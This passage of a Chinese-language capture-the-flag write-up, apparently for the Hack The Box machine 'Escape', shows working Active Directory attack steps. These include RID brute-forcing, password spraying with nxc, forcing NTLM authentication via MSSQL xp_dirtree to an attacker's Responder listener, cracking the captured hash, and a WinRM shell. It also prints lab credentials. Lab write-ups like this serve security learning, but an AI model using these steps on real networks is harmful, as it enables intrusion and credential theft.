<p>两个可读只有一个pdf，那顺便在枚举一下user吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb sequel.htb -u guest -p <span class="string">&#x27;&#x27;</span> --rid-brute</span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [+] sequel.htb\guest: </span><br><span class="line">SMB         10.129.228.253  445    DC               498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               500: sequel\Administrator (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               501: sequel\Guest (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               502: sequel\krbtgt (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               512: sequel\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               513: sequel\Domain Users (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               514: sequel\Domain Guests (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               515: sequel\Domain Computers (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               516: sequel\Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               517: sequel\Cert Publishers (SidTypeAlias)</span><br><span class="line">SMB         10.129.228.253  445    DC               518: sequel\Schema Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               519: sequel\Enterprise Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               520: sequel\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               521: sequel\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               522: sequel\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               525: sequel\Protected Users (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               526: sequel\Key Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               527: sequel\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               553: sequel\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">SMB         10.129.228.253  445    DC               571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         10.129.228.253  445    DC               572: sequel\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         10.129.228.253  445    DC               1000: sequel\DC$ (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1101: sequel\DnsAdmins (SidTypeAlias)</span><br><span class="line">SMB         10.129.228.253  445    DC               1102: sequel\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               1103: sequel\Tom.Henn (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1104: sequel\Brandon.Brown (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1105: sequel\Ryan.Cooper (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1106: sequel\sql_svc (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1107: sequel\James.Roberts (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1108: sequel\Nicole.Thompson (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1109: sequel\SQLServer2005SQLBrowserUser<span class="variable">$DC</span> (SidTypeAlias)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以整理一下</span></span><br><span class="line">$ nxc smb sequel.htb -u guest -p <span class="string">&#x27;&#x27;</span> --rid-brute | grep SidTypeUser | awk -F <span class="string">&#x27;\&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | awk -F <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">tee</span> user</span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DC$</span><br><span class="line">Tom.Henn</span><br><span class="line">Brandon.Brown</span><br><span class="line">Ryan.Cooper</span><br><span class="line">sql_svc</span><br><span class="line">James.Roberts</span><br><span class="line">Nicole.Thompson</span><br></pre></td></tr></table></figure>
<p>看一下pdf是什么内容<br><img src="/images/escape-1.png"><br>这给了一个<strong>PublicUser:GuestUserCantWrite1</strong>，让我们去登mssql，我偏不</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb sequel.htb -u user -p <span class="string">&quot;GuestUserCantWrite1&quot;</span> --continue-on-success</span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Administrator:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Guest:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\krbtgt:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\DC$:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Tom.Henn:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Brandon.Brown:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Ryan.Cooper:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\sql_svc:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\James.Roberts:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Nicole.Thompson:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line"></span><br><span class="line">$ nxc winrm sequel.htb -u user -p <span class="string">&quot;GuestUserCantWrite1&quot;</span> --continue-on-success                     </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)                                                                         </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Administrator:GuestUserCantWrite1                                   </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Guest:GuestUserCantWrite1     </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\krbtgt:GuestUserCantWrite1                                                                                                      </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\DC$:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Tom.Henn:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Brandon.Brown:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Ryan.Cooper:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\sql_svc:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\James.Roberts:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Nicole.Thompson:GuestUserCantWrite1</span><br></pre></td></tr></table></figure>
<p>呜呜呜我错了</p>
<h3 id="ntlm-hash-hijack"><a href="#ntlm-hash-hijack" class="headerlink" title="ntlm hash hijack"></a>ntlm hash hijack</h3><p>想起来有一个impacket-mssqlclient，用一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">$ mssqlclient.py PublicUser@sequel.htb              </span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL (PublicUser  guest@master)&gt; </span><br><span class="line"></span><br><span class="line">SQL (PublicUser  guest@master)&gt; enum_db       </span><br><span class="line">name     is_trustworthy_on                                                                       </span><br><span class="line">------   -----------------                                                                       </span><br><span class="line">master                   0                                                                       </span><br><span class="line">                                                                                                 </span><br><span class="line">tempdb                   0   </span><br><span class="line"></span><br><span class="line">model                    0   </span><br><span class="line"></span><br><span class="line">msdb                     1   </span><br><span class="line"></span><br><span class="line">SQL (PublicUser  guest@msdb)&gt; enum_users;</span><br><span class="line">[%] EXEC sp_helpuser</span><br><span class="line">UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   </span><br><span class="line">------------------   --------   ---------   ---------   -------------   ----------   -----   </span><br><span class="line">dbo                  db_owner   sa          master      dbo             b<span class="string">&#x27;1         &#x27;</span>   b<span class="string">&#x27;01&#x27;</span>   </span><br><span class="line"></span><br><span class="line">guest                public     NULL        NULL        guest           b<span class="string">&#x27;2         &#x27;</span>   b<span class="string">&#x27;00&#x27;</span>   </span><br><span class="line"></span><br><span class="line">INFORMATION_SCHEMA   public     NULL        NULL        NULL            b<span class="string">&#x27;3         &#x27;</span>    NULL   </span><br><span class="line"></span><br><span class="line">sys                  public     NULL        NULL        NULL            b<span class="string">&#x27;4         &#x27;</span>    NULL   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SQL (PublicUser  guest@msdb)&gt; enum_logins;</span><br><span class="line">[%] <span class="keyword">select</span> r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin from  master.sys.server_princi</span><br><span class="line">pals r left <span class="built_in">join</span> master.sys.syslogins sl on sl.sid = r.sid <span class="built_in">where</span> r.type <span class="keyword">in</span> (<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">name         type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   </span><br><span class="line">----------   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   </span><br><span class="line">sa           SQL_LOGIN             0          1               0             0            0              0           0           0           0   </span><br><span class="line"></span><br><span class="line">PublicUser   SQL_LOGIN             0          0               0             0            0              0           0           0           0   </span><br><span class="line"></span><br><span class="line">SQL (PublicUser  guest@msdb)&gt; exec_as_user sa;</span><br><span class="line">[%] execute as user=<span class="string">&#x27;sa;&#x27;</span>;</span><br><span class="line">[-] ERROR(DC\SQLMOCK): Line 1: Cannot execute as the database principal because the principal <span class="string">&quot;sa;&quot;</span> does not exist, this <span class="built_in">type</span> of principal cannot be impersonated, or you <span class="keyword">do</span> not have permission.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SQL (PublicUser  guest@msdb)&gt; xp_dirtree</span><br><span class="line">[%] <span class="built_in">exec</span> master.sys.xp_dirtree <span class="string">&#x27;&#x27;</span>,1,1</span><br><span class="line">subdirectory   depth   file   </span><br><span class="line">------------   -----   ----   </span><br></pre></td></tr></table></figure>
<p>只有一个xp_dirtree可以用了，捕获一下哈希</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mssqlclient</span></span><br><span class="line">SQL (PublicUser  guest@msdb)&gt; xp_dirtree \\10.10.xx.xx\wtf</span><br><span class="line">[%] <span class="built_in">exec</span> master.sys.xp_dirtree <span class="string">&#x27;\\10.10.xx.xx\wtf&#x27;</span>,1,1</span><br><span class="line">subdirectory   depth   file   </span><br><span class="line">------------   -----   ----   </span><br><span class="line"></span><br><span class="line"><span class="comment"># attacker</span></span><br><span class="line">$ <span class="built_in">sudo</span> responder -I tun0           </span><br><span class="line">[<span class="built_in">sudo</span>] wansh 的密码：              </span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|             </span><br><span class="line">                                                </span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0</span><br><span class="line">。。。</span><br><span class="line">[+] Listening <span class="keyword">for</span> events...</span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.228.253</span><br><span class="line">[SMB] NTLMv2-SSP Username : sequel\sql_svc</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:6a70418a9d8ff944:8E1A9D4D85A3A767E34BB54A66A5E2E1:010100000000000080A5E6F4E4B9DB01FAB0ABB16AB6BA840000000002000800590032005200380001001E00570049004E002D0032003200360052003000500059005A004E004700430004003400570049004E002D0032003200360052003000500059005A004E00470043002E0059003200520038002E004C004F00430041004C000300140059003200520038002E004C004F00430041004C000500140059003200520038002E004C004F00430041004C000700080080A5E6F4E4B9DB0106000400020000000800300030000000000000000000000000300000FA90285910D05096AA63E8D7615F591D4001CD78305A23CF9E82020B03A331D70A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000</span><br></pre></td></tr></table></figure>
<p><img src="/images/escape-2.png"><br>hashcat crack it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 5600 <span class="built_in">hash</span> /usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt</span><br><span class="line">SQL_SVC::sequel:6a70418a9d8ff944:8e1a9d4d85a3a767e34bb54a66a5e2e1:010100000000000080a5e6f4e4b9db01fab0abb16ab6ba840000000002000800590032005200380001001e00570049004e002d0032003200360052003000500059005a004e004700430004003400570049004e002d0032003200360052003000500059005a004e00470043002e0059003200520038002e004c004f00430041004c000300140059003200520038002e004c004f00430041004c000500140059003200520038002e004c004f00430041004c000700080080a5e6f4e4b9db0106000400020000000800300030000000000000000000000000300000fa90285910d05096aa63e8d7615f591d4001cd78305a23cf9e82020b03a331d70a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000:REGGIE1234ronnie</span><br></pre></td></tr></table></figure>
<p>又有一个密码了，在喷射一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb sequel.htb -u user -p <span class="string">&quot;REGGIE1234ronnie&quot;</span> --continue-on-success   </span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Administrator:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Guest:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\krbtgt:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\DC$:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Tom.Henn:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Brandon.Brown:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Ryan.Cooper:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\James.Roberts:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Nicole.Thompson:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br></pre></td></tr></table></figure>
<p>行吧，还是sql_svc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nxc winrm sequel.htb -u user -p <span class="string">&quot;REGGIE1234ronnie&quot;</span> --continue-on-success        </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Administrator:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Guest:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\krbtgt:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\DC$:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Tom.Henn:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Brandon.Brown:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Ryan.Cooper:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\James.Roberts:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Nicole.Thompson:REGGIE1234ronnie</span><br></pre></td></tr></table></figure>
<p>不行，还得是sql_svc</p>
<h2 id="shell-as-sql-svc"><a href="#shell-as-sql-svc" class="headerlink" title="shell as sql_svc"></a>shell as sql_svc</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> evil-winrm -i dc.sequel.htb -u sql_svc -p <span class="string">&#x27;REGGIE1234ronnie&#x27;</span></span><br><span class="line">/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="string">&#x27;quoting_detection_proc&#x27;</span> <span class="keyword">for</span> module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; <span class="built_in">cd</span> ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\sql_svc&gt; <span class="built_in">cd</span> desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\sql_svc\desktop&gt; <span class="built_in">dir</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\sql_svc\desktop&gt; </span><br></pre></td></tr></table></figure>
<p>在主目录下有一个SQLServer文件夹，进去翻一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\sql_svc\desktop&gt; <span class="built_in">cd</span> C:\                                                                                                                                   15:44:59 [9/367]</span><br><span class="line">*Evil-WinRM* PS C:\&gt; <span class="built_in">dir</span>                                                                         </span><br><span class="line">                                                                                                 </span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line">                                                                                                 </span><br><span class="line">                                                </span><br><span class="line">Mode                LastWriteTime         Length Name           </span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         2/1/2023   8:15 PM                PerfLogs</span><br><span class="line">d-r---         2/6/2023  12:08 PM                Program Files</span><br><span class="line">d-----       11/19/2022   3:51 AM                Program Files (x86)</span><br><span class="line">d-----       11/19/2022   3:51 AM                Public</span><br><span class="line">d-----         2/1/2023   1:02 PM                SQLServer</span><br><span class="line">d-r---         2/1/2023   1:55 PM                Users</span><br><span class="line">d-----         2/6/2023   7:21 AM                Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; <span class="built_in">cd</span> SQLServer</span><br><span class="line">*Evil-WinRM* PS C:\SQLServer&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\SQLServer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         2/7/2023   8:06 AM                Logs</span><br><span class="line">d-----       11/18/2022   1:37 PM                SQLEXPR_2019</span><br><span class="line">-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe</span><br><span class="line">-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\SQLServer&gt; <span class="built_in">cd</span> Logs</span><br><span class="line">*Evil-WinRM* PS C:\SQLServer\Logs&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\SQLServer\Logs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\SQLServer\Logs&gt; download ERRORLOG.BAK</span><br><span class="line">                                         </span><br><span class="line">Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to ERRORLOG.BAK</span><br><span class="line">                                         </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
<h3 id="get-pass-at-bak"><a href="#get-pass-at-bak" class="headerlink" title="get pass at .bak"></a>get pass at .bak</h3><p>看一下这个备份文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.</span><br><span class="line">2022-11-18 13:43:07.44 Logon       Logon failed <span class="keyword">for</span> user <span class="string">&#x27;sequel.htb\Ryan.Cooper&#x27;</span>. Reason: Password did not match that <span class="keyword">for</span> the login provided. [CLIENT: 127.0.0.1]</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Logon failed <span class="keyword">for</span> user <span class="string">&#x27;NuclearMosquito3&#x27;</span>. Reason: Password did not match that <span class="keyword">for</span> the login provided. [CLIENT: 127.0.0.1]</span><br><span class="line">2022-11-18 13:43:07.72 spid51      Attempting to load library <span class="string">&#x27;xpstar.dll&#x27;</span> into memory. This is an informational message only. No user action is required.</span><br></pre></td></tr></table></figure>
